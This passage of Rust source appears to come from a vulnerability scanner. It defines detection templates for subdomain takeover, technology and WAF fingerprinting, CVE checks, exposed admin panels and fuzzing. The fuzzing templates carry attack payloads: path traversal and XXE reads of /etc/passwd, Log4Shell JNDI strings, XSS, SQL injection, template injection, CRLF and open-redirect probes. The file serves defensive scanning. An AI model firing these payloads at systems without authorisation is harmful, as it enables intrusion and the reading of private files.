            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Word(vec!["NoSuchBucket".into()])]),
        tmpl("cname-github-takeover", "GitHub Pages Takeover", "high", "takeovers", &["github","takeover"],
            "Detects dangling CNAME pointing to unclaimed GitHub Pages.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Word(vec!["There isn't a GitHub Pages site here.".into()])]),
        tmpl("cname-heroku-takeover", "Heroku Subdomain Takeover", "high", "takeovers", &["heroku","takeover"],
            "Detects dangling CNAME pointing to unclaimed Heroku app.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Word(vec!["No such app".into()])]),
        tmpl("cname-azure-takeover", "Azure Subdomain Takeover", "high", "takeovers", &["azure","takeover"],
            "Detects dangling CNAME pointing to unclaimed Azure resource.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Word(vec!["404 Web Site not found".into()])]),

        // ─── Technologies ───────────────────────────────────────────
        tmpl("tech-wordpress", "WordPress Detection", "info", "technologies", &["wordpress","cms","tech"],
            "Detects WordPress CMS installations.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["wp-content".into()])]),
        tmpl("tech-joomla", "Joomla Detection", "info", "technologies", &["joomla","cms","tech"],
            "Detects Joomla CMS installations.",
            "GET", "{{BaseURL}}/administrator/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Joomla".into()])]),
        tmpl("tech-drupal", "Drupal Detection", "info", "technologies", &["drupal","cms","tech"],
            "Detects Drupal CMS installations.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Drupal".into()])]),
        tmpl("tech-laravel", "Laravel Detection", "info", "technologies", &["laravel","php","framework"],
            "Detects Laravel PHP framework installations.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["laravel_session".into()])]),
        tmpl("tech-nextjs", "Next.js Detection", "info", "technologies", &["nextjs","javascript","framework"],
            "Detects Next.js React framework.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["_next/static".into()])]),
        tmpl("tech-nuxtjs", "Nuxt.js Detection", "info", "technologies", &["nuxtjs","vue","framework"],
            "Detects Nuxt.js Vue framework.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["_nuxt".into()])]),
        tmpl("tech-django", "Django Detection", "info", "technologies", &["django","python","framework"],
            "Detects Django Python framework.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["csrfmiddlewaretoken".into()])]),
        tmpl("tech-rails", "Ruby on Rails Detection", "info", "technologies", &["rails","ruby","framework"],
            "Detects Ruby on Rails framework.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["csrf-token".into(), "rails".into()])]),
        tmpl("waf-cloudflare", "Cloudflare WAF Detection", "info", "technologies", &["waf","cloudflare","cdn"],
            "Detects Cloudflare WAF/CDN protection.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["cf-ray".into()])]),
        tmpl("waf-akamai", "Akamai WAF Detection", "info", "technologies", &["waf","akamai","cdn"],
            "Detects Akamai WAF/CDN protection.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["akamai".into()])]),

        // ─── Vulnerabilities ────────────────────────────────────────
        tmpl("backup-files", "Backup File Discovery", "medium", "vulnerabilities", &["backup","files","exposure"],
            "Discovers common backup file patterns that may contain source code or credentials.",
            "GET", "{{BaseURL}}/backup.sql", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["CREATE TABLE".into()])]),
        tmpl("sensitive-robots", "Sensitive Robots.txt Entries", "info", "vulnerabilities", &["robots","recon","info"],
            "Analyzes robots.txt for interesting disallowed paths that may reveal hidden functionality.",
            "GET", "{{BaseURL}}/robots.txt", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Disallow:".into()])]),
        tmpl("security-txt", "Security.txt Detection", "info", "vulnerabilities", &["security","recon"],
            "Detects security.txt file with vulnerability disclosure policy.",
            "GET", "{{BaseURL}}/.well-known/security.txt", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Contact:".into()])]),
        tmpl("crossdomain-xml", "Flash Crossdomain.xml", "medium", "vulnerabilities", &["flash","crossdomain","security"],
            "Detects permissive crossdomain.xml allowing any domain to make Flash requests.",
            "GET", "{{BaseURL}}/crossdomain.xml", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["allow-access-from".into(), "domain=\"*\"".into()])]),
        tmpl("clientaccesspolicy", "Silverlight ClientAccessPolicy", "medium", "vulnerabilities", &["silverlight","crossdomain"],
            "Detects permissive clientaccesspolicy.xml.",
            "GET", "{{BaseURL}}/clientaccesspolicy.xml", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["cross-domain-access".into()])]),
        tmpl("source-map-js", "JavaScript Source Map Exposure", "medium", "vulnerabilities", &["javascript","sourcemap","exposure"],
            "Detects exposed JavaScript source maps that reveal original source code.",
            "GET", "{{BaseURL}}/main.js.map", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["mappings".into(), "sources".into()])]),
        tmpl("sitemap-xml", "Sitemap.xml Discovery", "info", "vulnerabilities", &["sitemap","recon"],
            "Discovers sitemap.xml for URL enumeration.",
            "GET", "{{BaseURL}}/sitemap.xml", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["<urlset".into()])]),
        tmpl("error-page-disclosure", "Error Page Information Disclosure", "low", "vulnerabilities", &["error","information","disclosure"],
            "Detects verbose error pages leaking framework version, stack traces, or internal paths.",
            "GET", "{{BaseURL}}/nonexistent-page-12345", &[], "",
            &[TemplateMatcher::Word(vec!["Exception".into()]), TemplateMatcher::NegativeWord(vec!["404 Not Found".into()])]),

        // ─── Common CVEs ────────────────────────────────────────────
        tmpl("CVE-2023-44487", "HTTP/2 Rapid Reset DoS (CVE-2023-44487)", "high", "cves", &["http2","dos","cve2023"],
            "Detects potential vulnerability to HTTP/2 Rapid Reset attack. Server supports HTTP/2 — verify with targeted testing.",
            "GET", "{{BaseURL}}/", &[], "",
            &[TemplateMatcher::Status(200)]),
        tmpl("CVE-2024-21887", "Ivanti Connect Secure Auth Bypass", "critical", "cves", &["ivanti","vpn","auth-bypass","cve2024"],
            "Detects Ivanti Connect Secure/Pulse Secure VPN auth bypass.",
            "GET", "{{BaseURL}}/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["success".into()])]),
        tmpl("CVE-2023-46747", "F5 BIG-IP Auth Bypass (CVE-2023-46747)", "critical", "cves", &["f5","bigip","auth-bypass","cve2023"],
            "Detects F5 BIG-IP authentication bypass via request smuggling.",
            "GET", "{{BaseURL}}/tmui/login.jsp", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["BIG-IP".into()])]),
        tmpl("CVE-2023-22515", "Atlassian Confluence Auth Bypass", "critical", "cves", &["confluence","atlassian","auth-bypass","cve2023"],
            "Detects Atlassian Confluence Data Center/Server auth bypass allowing admin account creation.",
            "GET", "{{BaseURL}}/server-info.action", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Confluence".into()])]),
        tmpl("CVE-2023-34362", "MOVEit Transfer SQLi", "critical", "cves", &["moveit","sqli","cve2023"],
            "Detects MOVEit Transfer SQL injection vulnerability.",
            "GET", "{{BaseURL}}/human.aspx", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["MOVEit".into()])]),
        tmpl("CVE-2024-3400", "Palo Alto PAN-OS Command Injection", "critical", "cves", &["paloalto","firewall","rce","cve2024"],
            "Detects Palo Alto Networks PAN-OS GlobalProtect command injection.",
            "GET", "{{BaseURL}}/ssl-vpn/hipreport.esp", &[], "",
            &[TemplateMatcher::Status(200)]),
        tmpl("log4j-rce", "Log4j RCE (CVE-2021-44228)", "critical", "cves", &["log4j","java","rce","cve2021"],
            "Tests for Log4Shell (Log4j RCE) by injecting JNDI lookup patterns in common headers.",
            "GET", "{{BaseURL}}/", &[("X-Forwarded-For", "${jndi:ldap://127.0.0.1/test}"), ("User-Agent", "${jndi:ldap://127.0.0.1/test}")], "",
            &[TemplateMatcher::Status(200)]),

        // ─── Admin Panel Detection ──────────────────────────────────
        tmpl("admin-panel-login", "Admin Panel Detection", "info", "misconfiguration", &["admin","panel","login"],
            "Detects common admin panel login pages.",
            "GET", "{{BaseURL}}/admin", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["login".into(), "password".into()])]),
        tmpl("admin-phpmyadmin", "phpMyAdmin Detection", "medium", "misconfiguration", &["phpmyadmin","database","admin"],
            "Detects exposed phpMyAdmin database management interface.",
            "GET", "{{BaseURL}}/phpmyadmin/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["phpMyAdmin".into()])]),
        tmpl("admin-adminer", "Adminer Detection", "medium", "misconfiguration", &["adminer","database","admin"],
            "Detects exposed Adminer database management tool.",
            "GET", "{{BaseURL}}/adminer.php", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["Adminer".into()])]),

        // ─── Cloud / Infrastructure ─────────────────────────────────
        tmpl("aws-metadata", "AWS Metadata SSRF Check", "critical", "vulnerabilities", &["aws","ssrf","cloud","metadata"],
            "Tests for SSRF via AWS EC2 instance metadata endpoint access.",
            "GET", "{{BaseURL}}/latest/meta-data/", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["ami-id".into()])]),
        tmpl("firebase-db-open", "Firebase Database Open Access", "high", "misconfiguration", &["firebase","google","database"],
            "Detects openly accessible Firebase Realtime Database.",
            "GET", "{{BaseURL}}/.json", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::NegativeWord(vec!["Permission denied".into()])]),

        // ─── Fuzzing Templates ──────────────────────────────────────
        tmpl("lfi-etc-passwd", "LFI /etc/passwd", "high", "fuzzing", &["lfi","path-traversal","linux"],
            "Tests for Local File Inclusion vulnerability by attempting to read /etc/passwd.",
            "GET", "{{BaseURL}}/?file=../../../../etc/passwd", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["root:x:0:0".into()])]),
        tmpl("lfi-windows-hosts", "LFI Windows Hosts", "high", "fuzzing", &["lfi","path-traversal","windows"],
            "Tests for Local File Inclusion on Windows by reading hosts file.",
            "GET", "{{BaseURL}}/?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["localhost".into()])]),
        tmpl("rfi-test", "Remote File Inclusion Test", "critical", "fuzzing", &["rfi","injection"],
            "Tests for Remote File Inclusion by injecting external URL.",
            "GET", "{{BaseURL}}/?file=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/helpers/payloads/rfi.txt", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["rfi_test_string".into()])]),
        tmpl("xss-reflected-basic", "Reflected XSS Test", "medium", "fuzzing", &["xss","reflected","injection"],
            "Tests for basic reflected XSS by injecting a script tag.",
            "GET", "{{BaseURL}}/?q=<script>alert(1)</script>", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["<script>alert(1)</script>".into()])]),
        tmpl("sqli-error-mysql", "SQL Injection Error (MySQL)", "high", "fuzzing", &["sqli","mysql","injection"],
            "Tests for error-based SQL injection via MySQL error messages.",
            "GET", "{{BaseURL}}/?id=1'", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["You have an error in your SQL syntax".into()])]),
        tmpl("sqli-error-postgres", "SQL Injection Error (PostgreSQL)", "high", "fuzzing", &["sqli","postgres","injection"],
            "Tests for error-based SQL injection via PostgreSQL error messages.",
            "GET", "{{BaseURL}}/?id=1'", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["unterminated quoted string".into()])]),
        tmpl("ssti-basic", "Server-Side Template Injection Test", "high", "fuzzing", &["ssti","injection","template"],
            "Tests for SSTI by injecting a mathematical expression.",
            "GET", "{{BaseURL}}/?name={{7*7}}", &[], "",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["49".into()])]),
        tmpl("open-redirect-basic", "Open Redirect Test", "medium", "fuzzing", &["redirect","open-redirect"],
            "Tests for open redirect vulnerability.",
            "GET", "{{BaseURL}}/?redirect=https://evil.com", &[], "",
            &[TemplateMatcher::Status(302), TemplateMatcher::Word(vec!["evil.com".into()])]),
        tmpl("xxe-basic", "XXE Injection Test", "high", "fuzzing", &["xxe","xml","injection"],
            "Tests for XML External Entity injection.",
            "POST", "{{BaseURL}}/", &[("Content-Type", "application/xml")], "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            &[TemplateMatcher::Status(200), TemplateMatcher::Word(vec!["root:x:0:0".into()])]),
        tmpl("crlf-injection", "CRLF Injection Test", "medium", "fuzzing", &["crlf","injection","headers"],
            "Tests for CRLF injection in HTTP headers.",
            "GET", "{{BaseURL}}/%0d%0aSet-Cookie:crlftest=1", &[], "",
            &[TemplateMatcher::Word(vec!["crlftest".into()])]),
    ]
}

/// Helper to construct a NucleiTemplate concisely
fn tmpl(
    id: &str, name: &str, severity: &str, category: &str,
    tags: &[&str], description: &str,
    method: &str, path: &str, headers: &[(&str, &str)], body: &str,
    matchers: &[TemplateMatcher],
) -> NucleiTemplate {
    NucleiTemplate {
        id: id.to_string(),
        name: name.to_string(),
        severity: severity.to_string(),
        category: category.to_string(),
        tags: tags.iter().map(|t| t.to_string()).collect(),
        description: description.to_string(),
        author: "WonderSuite".to_string(),
        requests: vec![TemplateRequest {
            method: method.to_string(),
            path: path.to_string(),
            headers: headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
            body: body.to_string(),
        }],
        matchers: matchers.to_vec(),
    }
}
